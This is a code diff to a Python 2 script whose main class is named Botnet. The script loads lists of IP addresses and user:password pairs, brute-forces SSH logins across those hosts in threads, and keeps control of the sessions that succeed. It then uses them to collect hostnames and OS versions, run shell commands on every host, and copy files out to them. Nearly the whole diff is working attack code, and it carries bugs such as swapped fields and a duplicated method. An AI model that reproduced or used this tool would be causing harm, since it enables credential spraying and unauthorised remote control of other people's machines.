@@ -10,17 +10,27 @@ from time import sleep
 import threading
 
 class Command:
+
     def __init__(self, command, output):
         self.command = command
         self.output = output
 
 class Client:
+
     def __init__(self, host, user, password):
         self.commands = []
         self.host = host
+        self.hostname = None
         self.user = user
         self.password = password
+        self.version = None
         self.session = self.connect()
+
+    def set_hostname(self, hostname):
+        self.hostname = hostname
+
+    def set_version(self, version):
+        self.version = version
 
     def connect(self):
         try:
@@ -35,37 +45,61 @@ class Client:
     def store_command_data(self, command, output):
         self.commands.append(Command(command, output))
 
-
 class Botnet:
-    def __init__(self):
+    def __init__(self, ips, credentials):
         self.clients = []
-        with open('/etc/ips') as f:
+        with open(ips) as f:
             self.ips = [x.strip() for x in f.readlines()]
-        with open('/etc/pass') as f:
+        with open(credentials) as f:
             self.credentials = [x.strip().split(':') for x in f.readlines()]
 
-    def add_client(self, client):
-        self.clients.append(client)
-
-    def login(self, ip):
-        for user, password in self.credentials:
+    @staticmethod
+    def login(ip, credentials, clients):
+        for user, password in credentials:
             try:
                 client = Client(ip, user, password)
             except:
                 client = None
             finally:
                 if client.session is not None:
-                    self.add_client(client)
+                    clients.append(client)
+
+    def disconnect(self):
+        for client in self.clients:
+            client.session.logout()
 
     def connect(self):
         threads = []
         for ip in self.ips:
-            t = threading.Thread(target=self.login, args=(ip,))
+            t = threading.Thread(target=self.login, args=(ip, self.credentials, self.clients))
             threads.append(t)
             t.start()
 
         for t in threads:
             t.join()
+
+        threads = None
+
+        for client in self.clients:
+            client.session.sendline("echo $HOSTNAME")
+            client.session.prompt()
+            split_output = client.session.before.split("\n")
+            client.set_version(split_output[1])
+            client.session.sendline("sw_vers -productVersion")
+            client.session.prompt()
+            split_output = client.session.before.split("\n")
+            client.set_hostname(split_output[1])
+
+    def send_command(self, command, clients):
+        for client in clients:
+            client.session.sendline(command)
+            client.session.prompt()
+            split_output = client.session.before.split("\n")
+            del split_output[0]
+            output = ""
+            for line in split_output:
+                output += line + "\n"
+            client.store_command_data(command, output)
 
     def send_command(self, command):
         for client in self.clients:
@@ -78,13 +112,18 @@ class Botnet:
                 output += line + "\n"
             client.store_command_data(command, output)
 
+    def send_file_or_folder(self, file_or_folder, to_location):
+        for client in self.clients:
+            client.session.sendline("scp -r " + file_or_folder + " " + client.user + "@" + client.host + ":" + to_location)
+            client.session.prompt()
+            client.session.sendline(client.password)
+
     def print_output(self):
         for client in self.clients:
             print "\n" + client.host
             for command in client.commands:
                 print "\n" + command.command
                 print "\n" + command.output
-
 
 def print_color(text, color):
     if color is "green":
@@ -96,24 +135,15 @@ def print_color(text, color):
     else:
         print(text + "\nColor not found!")
 
-# def login(botnet):
-#     for botnet.user, botnet.passwd in botnet.credentials:
-#         try:
-#             client = Client(ip, user, passwd)
-#         except:
-#             client = None
-#         finally:
-#             if client is not None:
-#                 botnet.add_client(client)
-#                 break
-
 def main():
-    botnet = Botnet()
 
+    botnet = Botnet("/etc/ips", "/etc/pass")
     botnet.connect()
     botnet.send_command("ls -la")
+    #botnet.send_file_or_folder("/Users/alexzoltowski/hi.txt", "/Users/sysop/")
     botnet.send_command("ls")
     botnet.print_output()
+    botnet.disconnect()
 
 if __name__ == "__main__":
     main()
